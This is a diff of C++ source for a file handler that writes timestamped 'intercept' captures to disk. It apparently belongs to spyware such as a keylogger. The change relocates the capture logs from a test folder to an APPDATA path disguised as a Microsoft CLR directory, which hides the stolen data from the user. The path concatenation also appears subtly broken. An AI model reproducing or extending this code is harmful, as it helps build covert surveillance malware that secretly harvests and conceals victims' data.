@@ -11,12 +11,17 @@ using namespace std;
 
 namespace file_handler
 {
-    const string path = "D:\\project\\testing\\";
-    const string name = "test_file.txt";
+    string path = (string)getenv("APPDATA") + "Local\\Microsoft\\CLR\\";
+    string name = date_time::get_date_time("-", "-");
 
     void write_logs(const string &msg)
     {
-        fstream file(path + "logs.log", ios::app);
+        fstream file;
+        if (path[path.length() - 1] == '\\')
+            file.open(path + "logs.log", ios::app);
+        else
+            file.open(path + "\\logs.log", ios::app);
+
         if (!file)
             return;
 
@@ -58,15 +63,7 @@ namespace file_handler
             return false;
         }
 
-        fstream file(get_full_path(), ios::app);
-        if (!file)
-        {
-            write_logs("Can't create/open intercept file --> " + get_full_path());
-            return false;
-        }
-
-        file.close();
-        write_logs("Successfully created file/folders");
+        write_logs("Successfully created/checked folders");
         return true;
     }
 
@@ -84,7 +81,7 @@ namespace file_handler
         }
         file << "<<" << date_time::get_date_time() << ">>\n"
              << captured << "\n";
-             
+
         file.close();
         write_logs("Successfully wrote intercept");
         return true;
